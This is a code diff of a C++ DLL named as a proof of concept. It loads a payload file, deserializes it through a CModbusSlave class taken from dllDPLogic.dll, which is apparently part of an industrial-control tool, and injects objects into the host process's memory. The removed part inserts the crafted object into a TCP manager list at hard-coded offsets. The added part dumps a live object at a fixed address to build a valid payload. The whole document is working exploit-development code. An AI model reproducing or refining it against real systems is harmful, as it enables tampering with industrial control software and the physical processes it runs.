@@ -1,96 +1,96 @@
 #include <afx.h>
 #include <afxwin.h>
+#include <fstream>
 #include <vector>
 
-#define IDA_BASE 0x00400000
-#define TCP_MANAGER_IDA_ADDR 0x0084713C
-#define LIST_OFFSET 0x40
+typedef CRuntimeClass* (__stdcall* PGET_CLASS)();
 
-void ShowError(LPCTSTR msg) {
-    ::MessageBox(NULL, msg, _T("Injector"), MB_OK | MB_ICONERROR);
-}
-
-extern "C" __declspec(dllexport) void RunPoc()
-{
-    AFX_MANAGE_STATE(AfxGetStaticModuleState());
-
-    CFile file;
-    if (!file.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary)) {
-        ShowError(_T("Payload not found"));
+void InjectPayload() {
+    const char* path = "C:\\payload.bin";
+    CFile f;
+    CFileException fe;
+    if (!f.Open(path, CFile::modeRead | CFile::typeBinary, &fe)) {
+        ::MessageBox(NULL, "Payload file not found!", "Error", MB_OK);
         return;
     }
-    ULONGLONG size = file.GetLength();
-    std::vector<BYTE> buffer((size_t)size);
-    file.Read(buffer.data(), (UINT)size);
-    file.Close();
 
-    CMemFile memFile(buffer.data(), (UINT)size);
+    int len = (int)f.GetLength();
+    std::vector<char> buf(len);
+    f.Read(buf.data(), len);
+    f.Close();
+
+    CMemFile memFile((BYTE*)buf.data(), len);
     CArchive ar(&memFile, CArchive::load);
 
     HMODULE hDll = GetModuleHandle(_T("dllDPLogic.dll"));
     if (!hDll) {
-        ShowError(_T("dllDPLogic not loaded"));
+        ::MessageBox(NULL, "dllDPLogic.dll not loaded!", "Error", MB_OK);
         return;
     }
 
-    typedef CRuntimeClass* (__stdcall* PGET_CLASS)();
     FARPROC proc = GetProcAddress(hDll, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
     if (!proc) {
-        ShowError(_T("Factory not found"));
+        ::MessageBox(NULL, "Factory not found!", "Error", MB_OK);
         return;
     }
 
     PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
-    CRuntimeClass* pClass = getClass();
-    CObject* pObj = pClass->CreateObject();
+    CRuntimeClass* runtimeClass = getClass ? getClass() : nullptr;
+    if (!runtimeClass) {
+        ::MessageBox(NULL, "Runtime class is null!", "Error", MB_OK);
+        return;
+    }
 
-    if (!pObj) {
-        ShowError(_T("CreateObject failed"));
+    CObject* obj = runtimeClass->CreateObject();
+    if (!obj) {
+        ::MessageBox(NULL, "CreateObject failed!", "Error", MB_OK);
         return;
     }
 
     try {
-        pObj->Serialize(ar);
-    } catch (CException* e) {
+        obj->Serialize(ar);
+        ::MessageBox(NULL, "Payload Verified Successfully!", "Success", MB_OK);
+    }
+    catch (CArchiveException* e) {
+        CString msg;
+        msg.Format("Serialize Error! Code: %d\n3=Schema/Version\n4=BadIndex\n6=End of File", e->m_cause);
+        ::MessageBox(NULL, msg, "Debug Info", MB_OK | MB_ICONERROR);
         e->Delete();
-        ShowError(_T("Serialize Failed"));
-        delete pObj;
-        return;
-    }
-
-    HMODULE hMod = GetModuleHandle(_T("dllDPLogic.dll"));
-    if (!hMod) {
-        ShowError(_T("dllDPLogic.dll not loaded!"));
-        delete pObj;
-        return;
-    }
-    DWORD_PTR baseAddr = (DWORD_PTR)hMod;
-    DWORD_PTR offset = TCP_MANAGER_IDA_ADDR - IDA_BASE;
-    void** pManagerPtr = (void**)(baseAddr + offset);
-    void* pManager = *pManagerPtr;
-
-    if (!pManager) {
-        ShowError(_T("Manager is NULL"));
-        delete pObj;
-        return;
-    }
-
-    try {
-        CObList* pList = (CObList*)((char*)pManager + LIST_OFFSET);
-        pList->AddTail(pObj);
-
-        try { *(void**)((char*)pObj + 4) = pManager; } catch (...) {}
-
-        ::MessageBox(NULL, _T("🎉 Attached via Offset 0x40! Check Tree View!"), _T("Success"), MB_OK);
-        pObj = nullptr;
     }
     catch (...) {
-        ShowError(_T("Crash during AddTail"));
+        ::MessageBox(NULL, "Unknown Crash", "Fatal", MB_OK);
+    }
+}
+
+extern "C" __declspec(dllexport) void RunPoc() {
+    AFX_MANAGE_STATE(AfxGetStaticModuleState());
+
+    void* pRealObj = (void*)0x0F2D2A04;
+
+    if (IsBadReadPtr(pRealObj, 4)) {
+        ::MessageBox(NULL, "Memory address 0F2D2A04 is invalid!\nDid you close the project?", "Error", MB_OK);
+        InjectPayload();
+        return;
     }
 
-    if (pObj) {
-        delete pObj;
+    CFile fDump;
+    if (!fDump.Open("C:\\valid_dump.bin", CFile::modeCreate | CFile::modeWrite | CFile::typeBinary)) {
+        ::MessageBox(NULL, "Cannot create C:\\valid_dump.bin", "Error", MB_OK);
+        return;
     }
-    ar.Close();
-    memFile.Close();
+
+    CArchive arStore(&fDump, CArchive::store);
+
+    try {
+        CObject* pSlave = (CObject*)pRealObj;
+        pSlave->Serialize(arStore);
+
+        arStore.Close();
+        fDump.Close();
+
+        ::MessageBox(NULL, "✅ GOLDEN SAMPLE DUMPED!\nLocation: C:\\valid_dump.bin\nPlease analyze this file.", "Success", MB_OK);
+    }
+    catch (...) {
+        InjectPayload();
+    }
 }
